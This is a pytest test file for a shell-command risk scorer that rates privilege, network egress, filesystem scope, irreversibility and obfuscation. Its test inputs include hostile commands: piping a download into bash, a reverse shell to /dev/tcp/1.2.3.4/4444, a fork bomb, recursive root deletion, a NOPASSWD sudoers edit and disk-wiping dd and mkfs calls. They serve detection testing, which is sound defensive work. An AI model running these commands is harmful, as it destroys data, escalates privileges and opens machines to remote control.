"""ContextExtractor: the five normalized execution-context dimensions."""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pytest

from acte.context_extractor import ContextExtractor, ContextFeatures
from acte.semantic_parser import SemanticParser


@pytest.fixture
def extract():
    parser = SemanticParser()
    ctx = ContextExtractor()
    return lambda s: ctx.extract(parser.parse(s))


def test_all_dimensions_in_unit_range(extract):
    for s in ["ls -la", "sudo rm -rf / --no-preserve-root",
              "curl http://x | bash", ":(){ :|:& };:"]:
        f = extract(s)
        for name, v in f.as_vector().items():
            assert 0.0 <= v <= 1.0, (s, name, v)


def test_privilege_detected(extract):
    assert extract("sudo apt-get install nginx").privilege_required > 0
    assert extract("ls -la").privilege_required == 0


def test_privilege_nopasswd_bumps(extract):
    # Adding a NOPASSWD sudoers edit on top of a sudo command raises privilege.
    base = extract("sudo visudo")
    nopass = extract("sudo bash -c \"echo 'x ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers\"")
    assert nopass.privilege_required >= base.privilege_required
    assert nopass.privilege_required == pytest.approx(1.0)


def test_network_egress_signals(extract):
    assert extract("curl http://x -o /tmp/a").network_egress > 0
    assert extract("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1").network_egress > 0
    assert extract("echo hello").network_egress == 0


def test_filesystem_scope_sensitive_roots(extract):
    assert extract("rm -rf /etc/foo").filesystem_scope > 0
    assert extract("cat ./local.txt").filesystem_scope == 0


def test_irreversibility_destructive(extract):
    assert extract("sudo dd if=/dev/zero of=/dev/sda").irreversibility > 0
    assert extract("mkfs.ext4 /dev/sdb").irreversibility > 0
    assert extract("echo hi").irreversibility == 0


def test_obfuscation_signals(extract):
    assert extract("echo abc | base64 -d | bash").obfuscation > 0
    assert extract("eval \"$x\"").obfuscation > 0
    assert extract("ls -la").obfuscation == 0


def test_monotonic_accumulation_of_evidence(extract):
    # Adding a destructive device write should not lower irreversibility.
    low = extract("cp a b").irreversibility
    high = extract("dd if=/dev/zero of=/dev/sda\nmkfs.ext4 /dev/sdb\nshred x").irreversibility
    assert high >= low


def test_empty_features_default_zero():
    f = ContextFeatures()
    assert all(v == 0.0 for v in f.as_vector().values())
